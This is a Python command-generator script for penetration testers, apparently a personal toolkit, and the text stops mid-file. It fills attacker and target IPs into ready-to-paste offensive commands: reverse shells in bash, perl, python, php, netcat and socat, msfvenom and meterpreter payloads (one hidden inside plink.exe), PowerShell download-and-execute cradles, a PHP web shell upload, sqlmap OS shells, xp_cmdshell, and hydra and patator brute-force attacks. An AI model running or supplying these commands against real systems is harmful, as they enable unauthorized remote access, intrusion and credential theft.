import argparse
import pyperclip
from os import system, name 

parser = argparse.ArgumentParser(description='Program created by eRaMvn. This program generates commands for pentesters to avoid mistakes during an engagement', 
    usage='%(prog)s source_ip [-lp your_local_port] target_ip [-d directory_to_store_file]')
parser.add_argument('source', metavar=" [source ip]", help="source ip address - usually attacker's ip address")
parser.add_argument('target', metavar=" [target ip]", help="target's ip address")
parser.add_argument('-lp', type=int, metavar="[port]", default=443, help='local port to listen to. Default port is 443')
parser.add_argument('-d', metavar="[directory]", default="~/Desktop", help='directory where files can be stored')
parser.add_argument('-c', metavar="[tool_name]", default="", help='quickly obtain the tool command without going through the program flow')
parser.add_argument('-v', action='version', version='%(prog)s version 1.1')

args = parser.parse_args()
source_ip = args.source
local_port = args.lp
target_ip = args.target
store_directory = args.d
tool_to_retrieve = args.c

r"""
To be implemented:
LECmd.exe -d "E:\[root]\Users\vibranium\AppData\Roaming\Microsoft\Windows\Recent" --csv "G:\Netwars\Analysis\Shellitems_vibranium" -q
SBECmd.exe -d "E:\[root]\Users\vibranium\AppData\Local\Microsoft\Windows" --csv "G:\Netwars\Analysis" -q
PECmd.exe -d "E:\[root]\Windows\Prefetch" -q --csv G:\Netwars\Analysis
C:\"Forensic Program Files"\Python\ShimCacheParser.py -i SYSTEM -o G:\Netwars\Analysis\shimcache_vibranium.csv

Invoke-Bloodhound -CollectionMethod All
(for %t in ("open 10.1.1.110 21" ftp bin "GET nc.exe" bye) do @echo %~t) >ftp.txt&&ftp -s:ftp.txt
netstat -alnp
netstat -plnt
"""

"""
Eliminate the / at the end of directory
"""
if store_directory[-1] == "/":
    store_directory = store_directory[:-1]

# define our clear function 
def clear(): 
  
    # for windows 
    if name == 'nt': 
        _ = system('cls') 
  
    # for mac and linux(here, os.name is 'posix') 
    else: 
        _ = system('clear') 

def tools(listoftools):
    n = 1
    for tool in sorted(listoftools):
        print(tool, end=" | ")
        if n == 11:
            print('\n')
            n = 1
        n += 1
    if n <= 11:
        print('\n')
    print("-" * 70)

def copy_to_clipboard(options):
    # Print out all of the commands
    for key in options:
        print("---" + options[key][0] + "---")
        print(str(key) + ". " + options[key][1])
        print("-" * 70)

    if tool_to_retrieve != "":
        print('Please select commmand number to copy to clipboard. Type "e" to quit, "c" to clear screen. ')
    else:
        print('Please select commmand number to copy to clipboard. Type "0" to return to tool selection, "c" to clear screen. ')

    while True:
        try:
            choice = input("Input: ").strip()
            if choice == "0" or choice == "b" or choice == "back" or choice == "exit" or choice == "e" or choice == "quit" or choice == "q":
                print("-" * 70)
                if tool_to_retrieve != "":
                    print("Program exits!")
                else: 
                    print("Taking you back to tool selection!")
                print("-" * 70)
                break
            elif choice == "c" or choice == "clear":
                clear()
                if tool_to_retrieve != "":
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
                else:
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
            elif choice == "l" or choice == "list":
                for key in options:
                    print("---" + options[key][0] + "---")
                    print(str(key) + ". " + options[key][1])
                    print("-" * 70)
            elif int(choice) > len(options) or int(choice) < 0:
                if tool_to_retrieve != "":
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
                else:
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
            else:
                #Copy command to clipboard
                pyperclip.copy(options[int(choice)][1])
                print("It has been copied to your clipboard!")
                if tool_to_retrieve != "":
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to exit, "l" to list options, "c" to clear screen.')
                else:
                    print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
        except:
            print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
           

def get_url():
    choice = input("Input: ").strip()
    return choice

def nmap():
    print("Please enter the port for nmap to scan. Leave blank to use default")
    ports = input("Input: ").strip()
    if ports == "":
        ports = "[edit port]"
    options = {1 : ["nmap phase 1", f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_network_nmap_tcp_ports.txt {target_ip}"],
        2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_network_nmap_detailed.txt {target_ip}"],
        3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_network_nmap_vuln_scan.txt {target_ip}"],
        4: ["nmap udp scan", f"nmap -Pn -p- -nvvv -sU --stats-every 3m --max-retries 2 --min-rate 5000 -oN {store_directory}/{target_ip}_network_nmap_udp_ports.txt {target_ip}"],
        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_network_nmap_firewalk.txt {target_ip}"]
    }

    copy_to_clipboard(options)

def hydra():
    print('Please enter the path to the login form. For example: 10.10.10.9/login.php. Enter "login.php"')
    path = get_url()
    if path[0] != "/":
        path = "/" + path

    print('Please enter request from burp (^USER^ and ^PASS^")')
    request = get_url()

    print("Please enter user list location or enter a simple value. Leave blank for /mnt/hgfs/Pentest/password_cracking/top_usernames.txt")
    user_list = input("Input: ").strip()
    if user_list == "":
        user_list = "/mnt/hgfs/Pentest/password_cracking/top_usernames.txt"

    print("Please enter password list location or enter a simple value. Leave blank for /mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt")
    pass_list = input("Input: ").strip()
    if pass_list == "":
        pass_list = "/mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt"

    print("Please error message. Leave blank to use default")
    error = input("Input: ").strip()
    if error == "":
            error = "invalid"

    options = {
        1 : ["hydra post request brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} http-post-form "{path}:{request}:{error}" -V -I'],
        2 : ["hydra rdp request bruteforce", f'hydra -t 2 -V -f -L {user_list} -I -P {pass_list} rdp://{target_ip}'],
        3 : ["hydra ftp bruteforce", f'hydra -t 4 -V -L {user_list} -I -P {pass_list} ftp://{target_ip}'],
        4 : ["hydra vnc bruteforce", f'hydra -L {user_list} -P {pass_list}  -t 1 -w 5 -f -s 5900 {target_ip} vnc -v'],
        5 : ["hydra ssh bruteforce", f'hydra -L {user_list} -P {pass_list} {target_ip} ssh']
    }

    copy_to_clipboard(options)

def patator():
    print('Please enter the path to the login form. For example: 10.10.10.9/login.php. Enter "login.php"')
    path = get_url()
    if path != "":
        if path[0] != "/":
            path = "/" + path

    print('Please enter the header if any. Example: "Cookie: security=low; PHPSESSID=1n3b0ma83kl75996udoiufuvc2"')
    header = input("Input: ").strip()
    if header == "":
        print("Please remember to remove the header argument")

    print('Please enter the body of the post request if any')
    body = input("Input: ").strip()

    print("Please enter user list location or enter a simple value. Leave blank for /mnt/hgfs/Pentest/password_cracking/top_usernames.txt")
    user_list = input("Input: ").strip()
    if user_list == "":
        user_list = "/mnt/hgfs/Pentest/password_cracking/top_usernames.txt"

    print("Please enter password list location or enter a simple value. Leave blank for /mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt")
    pass_list = input("Input: ").strip()
    if pass_list == "":
        pass_list = "/mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt"

    print("Please error message. Leave blank to use default")
    error = input("Input: ").strip()
    if error == "":
        error = "invalid"    

    # Generate get request
    if header == "":
        get_request = f'patator http_fuzz url="http://{target_ip}{path}" method=GET 0={user_list} 1={pass_list} -x ignore:code=404 -x ignore:fgrep="{error}"'
        if body == "":
            post_request = f'patator http_fuzz url="http://{target_ip}{path}" method=POST 0={user_list} 1={pass_list} -x ignore:code=404 -x ignore:fgrep="{error}"'
        else:
            post_request = f'patator http_fuzz url="http://{target_ip}{path}" method=POST body="{body}" 0={user_list} 1={pass_list} -x ignore:code=404 -x ignore:fgrep="{error}"'
    else:
        get_request = f'patator http_fuzz url="http://{target_ip}{path}" method=GET header="{header}" 0={user_list} 1={pass_list} -x ignore:code=404 -x ignore:fgrep="{error}"'

    options = {
        1 : ["patator get request", get_request],
        2 : ["patator post request", post_request],
        3 : ["patator post request with one value returned", f'patator http_fuzz url={target_ip}{path} method=POST body="{body}" -x ignore:egrep="^0"']
    }

    copy_to_clipboard(options)

def gobuster():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    print("Please enter word list location (Leave blank for default: directory-list-2.3-medium.txt). Others: /mnt/hgfs/Pentest/word_lists/list.txt")
    word_list = input("Input: ").strip()
    if word_list == "":
        word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

    options = {1 : ["Linux server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .php,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster.txt"],
        2 : ["Windows server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .asp,.aspx,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster.txt"],
        3 : ["cgi-bin directory", f"gobuster -u http://{url}:80/cgi-bin -w {word_list} -t 100 -x .pl,.sh -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_webapp_gobuster_cgi.txt"],
    }

    copy_to_clipboard(options)

def dirsearch():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    print("Please enter word list location (Leave blank for default: directory-list-2.3-medium.txt). Others: /mnt/hgfs/Pentest/word_lists/list.txt")
    word_list = input("Input: ").strip()
    if word_list == "":
        word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

    options = {
        1 : [f"dirsearch -u http://{url}/ -L {word_list} -E"]
    }

    copy_to_clipboard(options)

def wfuzz():
    options = {
        1 : ["Sample usage", f"wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://{target_ip}/FUZZ"],
        2 : ["Fuzz header", f"""wfuzz -c -z file,wordlist/general/common.txt -H "User-Agent: FUZZ" http://{target_ip}/"""]   
    }
    
    copy_to_clipboard(options)

def nikto():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {
        1 : ["Scan everything with nikto", f"nikto -h http://{url} | tee {store_directory}/{url}_webapp_nikto.txt"]
    }
    
    copy_to_clipboard(options)

def unicorn():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {
        1 : ["TCP scan", f"unicornscan -pa -r50 -mT {url} | tee {store_directory}/{url}_network_unicorn_tcp.txt"],
        2 : ["UDP scan", f"unicornscan -pa -r50 -mU {url} | tee {store_directory}/{url}_network_udp_ports.txt"]
    }
    
    copy_to_clipboard(options)

def curl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://192.168.25.55:11443/examples/test.jsp"
    
    options = {
        1 : ["Upload file with curl", f"curl -i -T /root/Desktop/test.jsp {url}"],
        2 : ["Upload file with PUT option", f"""curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' {url}"""],
        3 : ["Grab Headers and spoof user agent", f"""curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" {url}"""],
        4 : ["Scrape site after login", f"""curl -u user:pass -o outfile {url}"""],
        5 : ["Read local file", f"""curl file:///path/to/file"""]
    }
    
    copy_to_clipboard(options)

def rdesktop():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()
    options = {
        1 : ["rdp with full screen", f"rdesktop -u {user} -p {password} {target_ip} -f"]
    }
    
    copy_to_clipboard(options)

def ssh():
    user = input("Enter username to connect to: ").strip()
    port = input("Enter target port: ").strip
    options = {1 : ["Create a SSH connection", f"ssh {user}@{target_ip} -p 22"],
        2 : ["Dynamic port forwarding", f"ssh -ND 9050 {user}@{target_ip} -p 22"],
        3 : ["SSH with private key", f"ssh -i [key file] {user}@{target_ip}"],
        4 : ["Local port forwarding", f"ssh -CNL 81:{source_ip}:{port} {user}@{source_ip} -p 22"],
        5 : ["Local port forwarding", f"ssh -CNL 81:{target_ip}:{local_port} {user}@{target_ip} -p 22"],
        6 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{target_ip} -p 22"],
        7 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{source_ip} -p 22"]
    }
    
    copy_to_clipboard(options)

def nc():
    while True:
        try:
            target_port = int(input("Please enter the port listening on the target: ").strip())
        except:
            print("Enter an integer for a port")
        else:
            options = {
                1 : ["Reverse shell on linux target", f"nc -nv {source_ip} {local_port} -e /bin/bash"],
                2 : ["Reverse shell on windows target", f"nc -nv {source_ip} {local_port} -e cmd.exe"],
                3 : ["Reverse shell listener", f"nc -nvlp {local_port}"],
                4 : ["Bind shell listener on windows target", f"nc -lvp {target_port} -e cmd.exe"],
                5 : ["Bind shell connect", f"nc -nv {target_ip} {target_port}"],
                6 : ["Transfer file with nc at destination", f"nc -l -p {target_port} > out.file"],
                7 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
                8 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
                9 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
                10 : ["Port scan with nc (-u for udp)", f"nc -vz {target_ip} 1-1023"]
            }
            break
    
    copy_to_clipboard(options)

def msfvenom():
    options = {
        1 : ["Generate reverse shell executable on linux", f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell"],
        2 : ["Generate metepreter reverse shell executable on linux", f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell"],
        3 : ["Generate reverse shell code on windows", f'msfvenom -p windows/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} EXITFUNC=thread -b "\x00\x0a" -f python -v payload > shell'],
        4 : ["Generate metepreter reverse shell executable on windows", f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f asp > shell.asp"],
        5 : ["Generate reverse shell in php", f"msfvenom -p php/reverse_php LHOST={source_ip} LPORT={local_port} -f raw > shell1.phpD.png"],
        6 : ["Generate reverse shell in java", f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell.jsp"],
        7 : ["Embed shell code to plink.exe", f"msfvenom -p windows/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o plink_extra.exe"]     
    }
    
    copy_to_clipboard(options)

def smbclient():
    var = """\\"""
    options = {
        1 : ["Sample usage 1", f"smbclient -L {target_ip}"],
        2 : ["Sample usage 2", f'smbclient "\\\\\\{var}{target_ip}\<sharename>"'],
        3 : ["Sample usage 3", f'smbclient -U <username> //{target_ip}/<sharename>'],
        4 : ["Sample usage 4", f'smbclient //MOUNT/<sharename> -I {target_ip} -N'],
        5: ["Sample usage 5", f'smbclient -U <username>%<hash> --pw-nt-hash -L {target_ip}']
    }
    
    copy_to_clipboard(options)

def cewl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {
        1 : ["Get all words on a page", f"cewl {url} -w {store_directory}/{target_ip}_webapp_cewl.txt"]
    }
    
    copy_to_clipboard(options)

def wpscan():
    print("Please enter the url. Leave blank to use default")
    url = get_url()

    options = {
        1 : ["Standard wpscan", f"/usr/share/wpscan/wpscan.rb --url {url} --enumerate --log wpscan-{target_ip}"]
    }
    
    copy_to_clipboard(options)

def sshuttle():
    options = {
        1 : ["Sample sshutle usage", f"shuttle -r joe@10.11.1.252:22 10.2.2.0/24"]
    }
    
    copy_to_clipboard(options)

def sqlmap():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://10.11.12.108/comment.php?id=738"

    options = {
        1 : ["Standard sqlmap scan", f"sqlmap -r request_file --level 5 --risk 3 --dbms=mysql --dump --batch"],
        2 : ["Get shell with sqlmap", f"sqlmap -u {url} --dbms=mysql --os-shell"]
    }
    
    copy_to_clipboard(options)

def shell():
    options = {
        1 : ["Reverse shell with bash", f"bash -i >& /dev/tcp/{source_ip}/{local_port} 0>&1"],
        2 : ["Reverse shell with perl", """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (source_ip, local_port)],
        3 : ["Reverse shell with python", f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{source_ip}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""],
        4 : ["Reverse shell with php", f"""php -r '$sock=fsockopen("{source_ip}",{local_port});exec("/bin/bash -i <&3 >&3 2>&3");'"""],
        5 : ["Reverse shell with mkfifo", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {source_ip} {local_port} >/tmp/f"],
        6 : ["Reverse shell with xterm", f"xterm -display {source_ip}:1"],
        7 : ["Spawn tty shell with python", f"""python -c 'import pty; pty.spawn("/bin/bash")'"""],
        8 : ["Spawn tty shell with python", f"""python3 -c 'import pty; pty.spawn("/bin/bash")'"""],
        9 : ["Spawn tty shell with python", f"""import pty; pty.spawn("/bin/bash")"""]
    }
    
    copy_to_clipboard(options)

def mysql():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()

    options = {
        1 : ["Sign in to mysql", f"mysql -u{user} -{password} -h {target_ip}"],
        2 : ["Hostname & IP", f"SELECT @@hostname;"],
        3 : ["Hostname & IP", f"SELECT @@hostname;"],
        4 : ["Current DB", f"SELECT database();"],
        5 : ["List DBs", f"SELECT distinct (db) FROM mysql.db;"],
        6 : ["Current user", f"SELECT user();"],
        7 : ["List users", f"SELECT username FROM mysql.user;"],
        8 : ["List password hashes", f"SELECT host,user,password FROM mysql.user;"],
        9 : ["List all tables and columns", f"SELECT table schema, table name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"],
        10 : ["Execute OS command through mysql", f"""osql -S {target_ip}, port -U sa -P {password} -Q "exec xp_cmdshell 'command''"""],
        11 : ["Write to file system", f"SELECT * FROM mytable INTO dumpfile '{store_directory}/somefile';"]
    }
    
    copy_to_clipboard(options)

def dig():
    options = {
        1 : ["Zone transfer with dig", f"dig axfr @{target_ip} [domain name]"]
    }
    
    copy_to_clipboard(options)

def enum4linux():
    options = {
        1 : ["All options with enum4linux", f"enum4linux -a {target_ip} | tee {store_directory}/{target_ip}_enum.txt"]
    }
    
    copy_to_clipboard(options)

def smtp_user_enum():
    options = {
        1 : ["Sample usage", f"smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t {target_ip}"]
    }
    
    copy_to_clipboard(options)

def mount():
    options = {
        1 : ["Mount nfs share", f"mount -t nfs {target_ip}:/home/vulnix /tmp/[folder]"],
        2 : ["Mount share on windows", f"mount -t cifs -o username=[user] //{target_ip}/[sharename] /tmp/[folder]"]
    }
    
    copy_to_clipboard(options)

def plink():
    options = {
        1 : ["Sample usage", f"plink.exe -l root -pw aBc123% -R 9090:127.0.0.1:9090 10.11.0.156 -P 80"]
    }
    
    copy_to_clipboard(options)

def tcpdump():
    options = {
        1 : ["Sample usage (listening to port 110)", f"tcpdump -nnvvs -i any port 110 -w test.pcap"],
        2 : ["Capture HTTP header", f"tcpdump -nnvvvs 1024 -i any -A -w test.pcap"],
        3 : ["Capture icmp packets", f"tcpdump -ni any icmp[icmptype]=icmp-echo"],
        4 : ["Sample rule set", f"tcpdump -i tun0 'src host [ip] and tcp[tcpflags]==tcp-syn'"]
    }
    
    copy_to_clipboard(options)

def powershell():
    options = {
        1 : ["Download and execute powershell script in cmd", f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        2 : ["Forcing powershell version 2", f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{source_ip}/shell.ps1'))"],
        5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
        6 : ["Download file with powershell step 1", f"$WebClient = New-Object System.Net.WebClient"],
        7 : ["Download file with powershell step 2", f"""$WebClient.DownloadFile("https://{source_ip}/file","C:\path\file")"""],
        8 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""]
    }
    
    copy_to_clipboard(options)


def tar():
    options = {
        1 : ["Create tar from files", f"tar cf file.tar files"],
        2 : ["Extract .tar", f"tar xf file.tar"],
        3 : ["Create .tar.gz", f"tar czf file.tar.gz files"],
        4 : ["Extract .tar.gz", f"tar xzf file.tar.gz"],
        5 : ["Create .tar.bz2", f"tar cjf file.tar.bz2 files"],
        6 : ["Extract .tar.bz2", f"tar xjf file.tar.bz2"]
    }
    
    copy_to_clipboard(options)

def mssql():
    options = {
        1 : ["DB version", f"SELECT @@version;"],
        2 : ["Detailed version info", f"EXEC xp_msver"],
        3 : ["Run OS command", f"EXEC master..xp_cmdshell 'command'"],
        4 : ["List DBs", f"SELECT name FROM master..sysdatabases;"],
        5 : ["Current user", f"SELECT user name();"],
        6 : ["List users", f"SELECT name FROM master..syslogins;"],
        7 : ["List columns", f"SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable';"],
        8 : ["Set advanced options", f"EXEC SP_CONFIGURE 'show advanced options', 1"],
        9 : ["Set xp_cmdshell", f"EXEC_SP_CONFIGURE 'xp_cmdshell', 1"]
    }
    
    copy_to_clipboard(options)

def postgres():
    options = {
        1 : ["DB version", f"SELECT version();"],
        1 : ["Hostname & IP", f"SELECT inet server_addr();"],
        2 : ["Current DB", f"SELECT current database();"],
        3 : ["List DBs", f"SELECT datname FROM pg database;"],
        4 : ["Current user", f"SELECT user;"],
        5 : ["List users", f"SELECT username FROM pg_user;"],
        6 : ["List password hashes", f"SELECT username,passwd FROM pg_shadow;"]
    }
    
    copy_to_clipboard(options)

def runas():
    options = {
        1 : ["Sample usage", r"""runas /profile /savedcred /user:ACCESS\Administrator 'cmd.exe /c whoami > C:\temp\test.txt'"""]
    }
    
    copy_to_clipboard(options)

def impacket():
    options = {
        1 : ["psexec sample usage", f'psexec.py HTB.local/[username]@{target_ip} "cmd.exe"'],
        2 : ["GetUserSPNs.py sample usage", f'GetUserSPNs.py <domain>/[username][:password] -dc-ip <ip>']
    }
    
    copy_to_clipboard(options)

def find():
    options = {
        1 : ["Find capable files", f"""find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null"""],
        2 : ["Find suid files 1", f"""find / -perm -u=s -type f 2>/dev/null"""],
        3 : ["Find suid files 2", r"""find / –user root –perm –4000 –exec ls –ldb {};2>/dev/null"""],
        4 : ["Find writable files", f"""find / -perm -2 ! -type l -ls 2>/dev/null"""]
    }
    
    copy_to_clipboard(options)

def merlin():
    options = {
        1 : ["Generate certificate for 7 days (in /merlin/data/x509)", r"""openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=eramvn.rocks" -days 7"""],
        2 : ["Start merlin server (in /merlin)", f'go run cmd/merlinserver/main.go -i {source_ip}'],
        3 : ["Generate merlin agent for windows (in /merlin/cmd/merlinagent)", f'GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://{source_ip}:{local_port}" -o agent.exe main.go'],
    }
    
    copy_to_clipboard(options)

def socat():
    options = {
        1 : ["Listen on server", r"""socat file:`tty`,raw,echo=0 tcp-listen:888"""],
        2 : ["On target machine", f"""socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{source_ip}:888"""]
    }
    
    copy_to_clipboard(options)

def snmp():
    options = {
        1 : ["Enumerate snmp - need to change version and community string", f"""snmpwalk -c public {target_ip} -v 2c"""],
        2 : ["Enumerate using onesixtyone", f"""onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {target_ip}"""]
    }
    
    copy_to_clipboard(options)

def others():
    options = {
        1 : ["Check changes in file", f"""watch -n 1 <command>"""],
        2 : ["Check running scripts", f"""systemctl list-timers --all"""],
        3 : ["Copy with scp", f"""scp -P 22 dave@{target_ip}:/home/dave /tmp"""],
        4 : ["Sign with ca private key", f"""/usr/bin/ssh-keygen -s /home/userca/ca -I key_id -n [principal_name] /tmp/key.pub"""],
        5 : ["Login with signed pub key", f"""ssh -i key-cert.pub -i key [principal_name]@localhost"""],
        6 : ["Transfer file - On server", f"""impacket-smbserver share `pwd`"""],
        7 : ["Transfer file 1 - On client", f"""net use z: \\{source_ip}\share"""],
        8 : ["Transfer file 1 - On client - Example:", f"""copy *.zip z:"""],
        9 : ["Transfer file 2 - On client - Powershell", f"""New-PSDrive -Name "EramDrive" -PSProvider "FileSystem" -Root "\\{source_ip}\share"""],
        10 : ["Transfer file 2 - On client - Powershell - Example:", f"""cp EramDrive\somefile"""],
        11 : ["Check python path", f"""python3 -c 'import sys; print(sys.path)';"""]
    }
    
    copy_to_clipboard(options)

def grep():
    options = {
        1 : ["Grep example 1", f"""grep -rnw '/' -e 'PRIVATE' 2>/dev/null"""],
        2 : ["Grep example 2", f"""grep -Ril "nina" 2>/dev/null"""]
    }
    
    copy_to_clipboard(options)

def cafae():
    options = {
        1 : ["Get file recently opened", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -recent_docs > G:\Netwars\Analysis\recent_docs_vibranium.csv"""],
        2 : ["Dump search history", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -search_history > G:\Netwars\Analysis\search_history_vibranium.csv"""],
        3 : ["Get file recently opened in windows", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -opensave_mru > G:\Netwars\Analysis\opensave_mru_vibranium.csv"""],
        4 : ["Track file recently used with userassist", r"""cafae.exe -hive "E:\[root]\Users\vibranium\NTUSER.DAT" -base10 -csv -timeformat hh:mm:ss -no_whitespace -userassist > G:\Netwars\Analysis\userassist_vibranium.csv"""]
    }
    
    copy_to_clipboard(options)

def linux():
    options = {
        1 : ["Service", f"/etc/init.d"],
        2 : ["Network configuration", "/etc/network/interfaces"],
        3 : ["Nameserver configuration", "/etc/resolv.conf"],
        4 : ["RHEL / Red Hat / CentOS / Fedora Linux Apache access file location", "/var/log/httpd/access_log"],
        5 : ["Debian / Ubuntu Linux Apache access log file location ", "/var/log/apache2/access.log"],
        6 : ["FreeBSD Apache access log file location", "/var/log/httpd-access.log"],
        7 : ["RHEL / Red Hat / CentOS / Fedora Linux Apache error file location", "/var/log/httpd/error_log"],
        8 : ["Debian / Ubuntu Linux Apache error log file location ", "/var/log/apache2/error.log"],
        9 : ["FreeBSD Apache error log file location", "/var/log/httpd-error.log"]
    }
    
    copy_to_clipboard(options)

def windows():
    options = {
        1 : ["Service", f"/etc/init.d"],
        2 : ["Windows version", f"%WinDir%\system32\eula.txt"],
        3 : ["Boot.ini", r"""c:\boot.ini"""],
        4 : ["win.ini #1", "%WinDir%\win.ini"],
        5 : ["win.ini #2", "%WinDir%\win.ini"],
        6 : ["SAM backup", "%WinDir%\Repair\SAM"],
        7 : ["Backup Hives Location on Vista, Win7, Win8, Win10, Serv2008, Serv2012 and Serv2016", "%WinDir%\System32\Config\Regback"],
        6 : ["NTUSER.dat on WinXP", "C:\Documents and Settings\<username"],
        6 : ["NTUSER.dat, SOFTWARE, SYSTEM on Win7-Win10", "%UserProfile%"],
        6 : ["USRCLASS.dat on Win7-Win10", "%UserProfile%\AppData\Local\Microsoft\Windows"],
        8 : ["php.ini #1", "%WinDir%\php.ini"],
        9 : ["php.ini #2", "%WinDir%\php.ini"],
        10 : ["php.ini #3", r"""c:\home\bin\stable\apache\php.ini"""],
        11 : ["httpd.conf #1", """c:\Program Files\Apache Group\Apache\conf\httpd.conf"""],
        12 : ["httpd.conf #2", """c:\Program Files\Apache Group\Apache2\conf\httpd.conf"""],
        13 : ["httpd.conf #3", r"""c:\Program Files\xampp\apache\conf\httpd.conf"""]
    }
    
    copy_to_clipboard(options)

def change(source, target, port):
    source_ip = source
    target_ip = target
    local_port = port
    while True:
        print('Please type "source" to change source ip, "target" to change target ip, "port" to change port, "c" to clear screen, "b" to go back')
        choice = input('Input: ').strip()
        if choice == "source":
            source_ip = input("Please enter the new source ip: ").strip()
            print("Source IP changed!")
        elif choice == "target": 
            target_ip = input("Please enter the new target ip: ").strip()
            print("Target IP changed!")
        elif choice == "port":
            local_port = int(input("Please enter the source port: ").strip())
            print("Source port changed!")
        elif choice == "b" or choice == "back":
            return (source_ip, target_ip, local_port)
        elif choice == "c" or choice == "clear":
            clear()
        else:
            continue

# map the inputs to the function blocks
options = {
    "nmap" : nmap,
    "hydra" : hydra,
    "gobuster" : gobuster,
    "nikto" : nikto,
    "unicorn" : unicorn,
    "curl" : curl,
    "rdesktop" : rdesktop,
    "ssh" : ssh,
    "nc" : nc,
    "msfvenom" : msfvenom,
    "smbclient" : smbclient,
